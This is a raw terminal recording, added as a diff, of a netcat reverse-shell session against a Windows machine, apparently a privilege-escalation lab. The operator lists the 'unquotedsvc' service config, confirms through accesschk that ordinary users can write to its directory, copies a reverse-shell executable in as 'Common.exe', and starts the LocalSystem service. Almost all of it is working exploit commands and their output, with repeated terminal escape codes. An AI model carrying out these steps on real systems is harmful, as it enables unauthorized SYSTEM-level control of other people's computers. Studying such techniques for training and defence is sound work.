@@ -1,0 +1,45 @@
+Script started on 2025-03-16 06:24:52+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 10334
+[KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7msc qc unquotedsvc[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsc qc unquotedsvc
+[Ksc qc unquotedsvc
+[K[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: unquotedsvc
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Unquoted Path Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mC:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hC:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+[KC:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+[KC:\Program Files\Unquoted Path Service
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Users
+  RW NT SERVICE\TrustedInstaller
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+[K
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mcopy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcopy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+[Kcopy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+[K        1 file(s) copied.
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mnet start unquotedsvc[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnet start unquotedsvc
+[Knet start unquotedsvc
+[KThe service is not responding to the control function.
+[K
+More help is available by typing NET HELPMSG 2186.
+
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[?2004l
+Script done on 2025-03-16 06:28:08+03:00 [COMMAND_EXIT_CODE="0"]
